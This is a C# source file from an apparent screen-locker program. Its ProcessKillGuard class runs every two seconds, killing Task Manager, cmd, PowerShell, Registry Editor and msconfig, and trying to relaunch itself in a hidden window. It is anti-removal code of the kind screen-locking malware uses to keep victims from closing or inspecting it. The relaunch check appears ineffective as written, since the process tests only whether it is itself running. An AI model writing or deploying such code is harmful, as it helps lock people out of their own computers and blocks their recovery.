namespace ScreenLocker.Protection;

using System.Diagnostics;

public static class ProcessKillGuard
{
    private static System.Threading.Timer? _guardTimer;
    private static readonly string ProcessName = Process.GetCurrentProcess().ProcessName;
    private static readonly string? ExecutablePath = Environment.ProcessPath;

    public static void Start()
    {
        _guardTimer = new System.Threading.Timer(GuardCallback, null, TimeSpan.Zero, TimeSpan.FromSeconds(2));
    }

    public static void Stop()
    {
        _guardTimer?.Dispose();
        _guardTimer = null;
    }

    private static void GuardCallback(object? state)
    {
        if (!IsProcessRunning(ProcessName) && ExecutablePath is not null)
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = ExecutablePath,
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            }
            catch { }
        }

        KillDangerousProcesses();
    }

    private static bool IsProcessRunning(string name)
    {
        return Process.GetProcessesByName(name).Length > 0;
    }

    private static void KillDangerousProcesses()
    {
        string[] dangerous = ["taskmgr", "cmd", "powershell", "pwsh", "regedit", "msconfig"];

        foreach (string procName in dangerous)
        {
            foreach (var proc in Process.GetProcessesByName(procName))
            {
                try { proc.Kill(); } catch { }
            }
        }
    }
}
